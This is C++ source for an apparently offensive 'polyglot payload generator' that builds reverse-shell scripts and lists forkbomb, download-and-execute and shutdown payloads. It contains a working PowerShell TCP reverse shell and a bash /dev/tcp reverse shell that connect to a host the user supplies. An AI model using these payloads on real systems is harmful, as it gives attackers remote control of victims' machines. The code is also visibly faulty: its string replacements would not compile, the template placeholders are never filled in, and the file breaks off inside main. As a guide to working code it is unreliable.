#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>
#include <ctime>
#include <cstdlib>
#include <unistd.h>  // For sleep
#include <termios.h> // For terminal colors
#include <arpa/inet.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <iomanip>

using namespace std;

// Function to set terminal text color
void setColor(string color) {
    if (color == "red") cout << "\033[1;31m";
    else if (color == "green") cout << "\033[1;32m";
    else if (color == "cyan") cout << "\033[1;36m";
    else if (color == "bold") cout << "\033[1m";
    else cout << "\033[0m"; // reset color
}

// Function to print banner
void printBanner() {
    setColor("blue");
    cout << " _______  _______  _______  __    _  _______  _______  _______  _______\n";
    cout << "|       ||       ||       ||  |  | ||       ||       ||       ||       |\n";
    cout << "|    ___||    ___||   _   ||   |_| ||    ___||   _   ||    ___||  _____|\n";
    cout << "|   | __ |   |___ |  | |  ||       ||   |___ |  | |  ||   |___ | |_____ \n";
    cout << "|   ||  ||    ___||  |_|  ||  _    ||    ___||  |_|  ||    ___||_____  |\n";
    cout << "|   |_| ||   |___ |       || | |   ||   |    |       ||   |___  _____| |\n";
    cout << "|_______||_______||_______||_|  |__||___|    |_______||_______||_______|\n";
    setColor("cyan");
    cout << "\t-- A polyglot payload generator --\n\n";
    setColor("");
}

// Function to list payloads
void listPayloads() {
    vector<vector<string>> actionsData = {
        {"reverse_shell", "Spawn a reverse shell"},
        {"cmd_exec", "Execute a command"},
        {"forkbomb", "Run a forkbomb"},
        {"memexec", "Embed and execute a binary"},
        {"download_exec", "Download and execute a file"},
        {"shutdown", "Shutdown computer"},
        {"custom", "Use custom Bash and Powershell scripts"},
    };

    cout << "\n[*] Payloads:\n";
    cout << left << setw(20) << "NAME" << "DESCRIPTION\n";
    for (const auto& row : actionsData) {
        cout << left << setw(20) << row[0] << row[1] << "\n";
    }
    cout << "\n";
}

// Utility functions
string toLower(const string& str) {
    string result;
    transform(str.begin(), str.end(), back_inserter(result), ::tolower);
    return result;
}

bool contains(const vector<string>& vec, const string& elem) {
    return find(vec.begin(), vec.end(), elem) != vec.end();
}

int strToInt(const string& str) {
    return stoi(str);
}

int intervalToSeconds(const string& interval) {
    char periodLetter = interval.back();
    int timeValue = stoi(interval.substr(0, interval.size() - 1));
    if (periodLetter == 's') return timeValue;
    if (periodLetter == 'm') return timeValue * 60;
    if (periodLetter == 'h') return timeValue * 3600;
    return timeValue;
}

string inputPrompt(const string& name, const string& message, const string& defaultValue = "none") {
    cout << name << " " << message << " (default: " << defaultValue << "): ";
    string line;
    getline(cin, line);
    return line.empty() ? defaultValue : line;
}

bool writeToFile(const string& filename, const string& data) {
    ofstream file(filename);
    if (file) {
        file << data;
        return true;
    } else {
        cerr << "[FILE WRITE ERROR]: Could not write to " << filename << endl;
        return false;
    }
}

string readFile(const string& filename) {
    ifstream file(filename);
    if (file) {
        stringstream buffer;
        buffer << file.rdbuf();
        return buffer.str();
    } else {
        cerr << "[FILE READ ERROR]: Could not read " << filename << endl;
        exit(EXIT_FAILURE);
    }
}

string getLocalIP() {
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return "127.0.0.1";
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) {
            s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                            host, NI_MAXHOST,
                            NULL, 0, NI_NUMERICHOST);
            if (s != 0) {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                return "127.0.0.1";
            }
            freeifaddrs(ifaddr);
            return string(host);
        }
    }

    freeifaddrs(ifaddr);
    return "127.0.0.1";
}

string randomString(size_t length) {
    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    string result;
    srand(time(0));
    generate_n(back_inserter(result), length, [&]() { return chars[rand() % chars.size()]; });
    return result;
}

// Function to generate payload
void generatePayload(const string& payloadName, const string& sleepInterval, const string& outFile, bool toStdout) {
    vector<string> availablePayloads = {
        "cmd_exec", "reverse_shell", "custom", "download_exec", "memexec", "shutdown", "forkbomb"
    };

    if (!contains(availablePayloads, payloadName)) {
        cerr << "[x] No such payload: " << payloadName << endl;
        exit(EXIT_FAILURE);
    }

    string polyglotTemplate = R"(
# Polyglot payload template
# Sleep Interval: SLEEP_INTERVAL seconds

# Powershell Command
POWERSHELL_COMMAND

# Bash Command
BASH_COMMAND
)";

    string interval = to_string(intervalToSeconds(sleepInterval));
    polyglotTemplate.replace(polyglotTemplate.find("SLEEP_INTERVAL"), 13, interval);

    string powershell, bash;
    if (payloadName == "reverse_shell") {
        powershell = "$client = New-Object System.Net.Sockets.TCPClient('HOST', PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
        bash = "bash -i >& /dev/tcp/HOST/PORT 0>&1";

        string host = inputPrompt("[RHOST]", "Host to connect to", getLocalIP());
        string port = inputPrompt("[RPORT]", "Port to connect to", "4444");
        replace(bash.begin(), bash.end(), "HOST", host);
        replace(bash.begin(), bash.end(), "PORT", port);
        replace(powershell.begin(), powershell.end(), "HOST", host);
        replace(powershell.begin(), powershell.end(), "PORT", port);
    }
    // Add handling for other payloads here...

    string finalOutFile = outFile.empty() ? randomString(12) + ".sc" : outFile;
    cout << "[+] Payload: " << finalOutFile << endl;

    if (toStdout) {
        cout << "\n[*] Polyglot Payload\n\n";
        cout << polyglotTemplate << endl;
    }

    if (writeToFile(finalOutFile, polyglotTemplate)) {
        cout << "[+] Payload written to file successfully: " << finalOutFile << endl;
    }
}

// Main function
int main(int argc, char* argv[]) {
    if (argc < 2) {
        cerr << "Usage: " << argv[0] << " -p <payload> [-l] [-s] [-i <interval>] [-o <output file>]"
